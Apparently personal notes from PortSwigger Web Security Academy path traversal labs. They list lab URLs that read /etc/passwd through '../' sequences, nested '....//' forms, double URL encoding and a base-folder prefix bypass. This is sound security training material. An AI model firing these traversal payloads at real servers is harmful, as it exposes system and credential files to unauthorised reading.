___

```
https://0af200fb03feb838824f564900bc0062.web-security-academy.net/image?filename=/etc/passwd
```

```
https://0af9004403ec535286c8cf3100fb0062.web-security-academy.net/image?filename=../../../etc/passwd
```

`....//` or `....\/`

```
https://0a16002004c795cb8567554500cb004d.web-security-academy.net/image?filename=....//....//....//etc/passwd
```

In some contexts, such as in a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the `../` characters. This results in `%2e%2e%2f` and `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work.

```
https://0a9f0022039b1e5880a649ed00f500a8.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

An application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`.



